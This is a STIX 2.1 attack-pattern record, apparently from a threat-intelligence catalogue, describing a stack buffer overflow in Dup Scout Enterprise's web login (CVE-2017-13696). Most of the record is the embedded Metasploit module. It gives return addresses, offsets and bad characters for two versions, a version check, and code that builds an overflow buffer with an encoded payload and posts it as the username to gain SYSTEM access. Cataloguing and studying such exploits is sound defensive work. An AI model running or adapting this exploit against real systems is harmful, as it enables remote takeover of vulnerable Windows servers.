{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4df6528e-2aae-4ded-a7b1-4138b7a4bcef",
    "created": "2024-08-14T16:52:50.349953Z",
    "modified": "2024-08-14T16:52:50.349957Z",
    "name": "Dup Scout Enterprise Login Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Dup Scout Enterprise versions <= 10.0.18. The buffer overflow exists via the web interface during login. This gives NT AUTHORITY\\SYSTEM access.  This module has been tested successfully on Dup Scout Enterprise versions:  9.9.14 on Windows 7 SP1 (x64); 9.9.14 on Windows XP SP0 (x64); 10.0.18 on Windows 7 SP1 (x64); 10.0.18 on Windows XP SP0 (x86); and 10.0.18 on Windows 10 (1909) (x64).  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/dup_scout_enterprise_login_bof.rb",
            "external_id": "dup_scout_enterprise_login_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-13696"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Dup Scout Enterprise Login Buffer Overflow',\n        'Description' => %q{\n          This module exploits a stack buffer overflow in Dup Scout Enterprise\n          versions <= 10.0.18. The buffer overflow exists via the web interface\n          during login. This gives NT AUTHORITY\\SYSTEM access.\n\n          This module has been tested successfully on Dup Scout Enterprise\n          versions:\n\n          9.9.14 on Windows 7 SP1 (x64);\n          9.9.14 on Windows XP SP0 (x64);\n          10.0.18 on Windows 7 SP1 (x64);\n          10.0.18 on Windows XP SP0 (x86); and\n          10.0.18 on Windows 10 (1909) (x64).\n        },\n        'License' => MSF_LICENSE,\n        'Author' =>\n          [\n            'sickness', # Original discovery and exploit\n            'Chris Higgins', # msf Module -- @ch1gg1ns\n            'bcoles', # Automatic targetting and v9.9.14 target\n          ],\n        'References' =>\n          [\n            ['CVE', '2017-13696'],\n            ['CWE', '121'],\n            ['EDB', '42557'],\n            ['EDB', '43145'],\n            ['EDB', '40832']\n          ],\n        'DefaultOptions' =>\n          {\n            'EXITFUNC' => 'thread'\n          },\n        'Platform' => 'win',\n        'Arch' => ARCH_X86,\n        'Payload' =>\n          {\n            'BadChars' => \"\\x00\\x0a\\x0d\\x25\\x26\\x2b\\x3d\"\n          },\n        'Targets' =>\n          [\n            [ 'Automatic', { 'auto' => true } ],\n            [\n              'Dup Scout Enterprise 9.9.14 (x86)',\n              {\n                # 0x100b5612 : push esp # ret  | ascii {PAGE_EXECUTE_READ} [libspp.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0-\n                'Version' => '9.9.14',\n                'Ret' => 0x100b5612,\n                'Offset' => 780\n              }\n            ],\n            [\n              'Dup Scout Enterprise 10.0.18 (x86)',\n              {\n                # 0x10090c83 : jmp esp |  {PAGE_EXECUTE_READ} [libspp.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0-\n                'Version' => '10.0.18',\n                'Ret' => 0x10090c83,\n                'Offset' => 780\n              }\n            ],\n          ],\n        'Notes' =>\n        {\n          'Stability' => [ CRASH_SERVICE_DOWN ],\n          'SideEffects' => [ IOC_IN_LOGS ],\n          'Reliability' => [ REPEATABLE_SESSION ]\n        },\n        'Privileged' => true,\n        'DisclosureDate' => '2017-11-14',\n        'DefaultTarget' => 0\n      )\n    )\n\n    register_options([Opt::RPORT(80)])\n  end\n\n  def check\n    res = send_request_cgi({\n      'uri' => '/',\n      'method' => 'GET'\n    })\n\n    unless res\n      return CheckCode::Unknown('Connection failed.')\n    end\n\n    version = res.body.scan(/>Dup Scout Enterprise v([\\d.]+)</).flatten.first\n\n    unless version\n      return CheckCode::Safe('Target is not Dup Scout Enterprise.')\n    end\n\n    unless target_for_version(version)\n      return CheckCode::Detected(\"No targets for Dup Scout Enterprise version #{version}.\")\n    end\n\n    CheckCode::Appears(\"Dup Scout Enterprise version #{version}.\")\n  end\n\n  def dup_version\n    res = send_request_cgi({\n      'uri' => '/',\n      'method' => 'GET'\n    })\n\n    unless res\n      return fail_with(Failure::Unreachable, 'Could not determine Dup Scout Enterprise version. No reply.')\n    end\n\n    res.body.scan(/>Dup Scout Enterprise v([\\d.]+)</).flatten.first\n  end\n\n  def target_for_version(version)\n    return unless version\n    targets.select { |t| version == t['Version'] }.first\n  end\n\n  def exploit\n    my_target = target\n\n    if target.name == 'Automatic'\n      print_status('Selecting a target...')\n      my_target = target_for_version(dup_version)\n      unless my_target\n        fail_with(Failure::NoTarget, 'Unable to automatically detect a target')\n      end\n    end\n\n    print_status(\"Using target: #{my_target.name}\")\n\n    print_status('Generating payload ...')\n\n    evil = rand_text(my_target['Offset'])\n    evil << [my_target.ret].pack('V')\n    evil << make_nops(12)\n    evil << payload.encoded\n    evil << make_nops(10_000 - evil.length)\n\n    print_status(\"Sending payload (#{evil.length} bytes) ...\")\n\n    send_request_cgi({\n      'uri' => '/login',\n      'method' => 'POST',\n      'vars_post' => {\n        'username' => evil,\n        'password' => rand_text(10..20)\n      }\n    })\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-11-14",
    "x_mitre_platforms": [
        "win'"
    ]
}